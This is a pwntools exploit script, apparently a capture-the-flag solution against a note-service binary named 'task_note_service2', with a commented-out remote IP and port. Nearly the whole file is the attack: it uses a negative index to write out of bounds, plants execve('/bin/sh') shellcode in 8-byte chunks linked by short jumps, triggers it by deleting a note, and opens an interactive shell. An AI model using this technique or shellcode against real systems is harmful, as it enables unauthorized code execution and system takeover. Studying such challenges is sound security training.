from pwn import *

p = process("./task_note_service2")
#p = remote("117.78.43.127",32059)
context.log_level = 'debug'

def add(index, size, content):
    p.recvuntil("your choice>> ")
    p.sendline("1")
    p.recvuntil("index:")
    p.sendline(str(index))
    p.recvuntil("size:")
    p.sendline(str(size))
    p.recvuntil("content:")

    p.sendline(content)

def delete(index):
    p.recvuntil("your choice>> ")
    p.sendline("4")
    p.recvuntil("index:")
    p.sendline(str(index))

def exit():
    p.recvuntil("your choice>> ")
    p.sendline("5")

offset = 17
add(-17, 8, "\x48\x31\xc0\x50\xeb\x1a") # xor rax, rax push rax
add(0, 8, "\x48\x31\xf6\x53\xeb\x1a") #xor rsi, rsi push rbx
gdb.attach(p)
add(1, 8, "\xbb\x2f\x62\x69\x6e\xeb\x19") #mov rbx, 0x6e69622f
add(2, 8, "\x48\x89\x1c\x24\xeb\x1a") #mov [rsp], rbx
add(3, 8, "\xbb\x2f\x2f\x73\x68\xeb\x19") #mov rbx, 0x68732f2f 
add(4, 8, "\x48\x89\x5c\x24\x04\xeb\x19") #mov [rsp+4], rbx
add(5, 8, "\x54\x5f\x5b\x5e\xeb\x1a") #push rsp pop rdi pop rbx pop rsi
add(6, 8, "\xb0\x3b\x0f\x05")     #
delete(2)
#log.info("execve shellcode")
p.interactive()
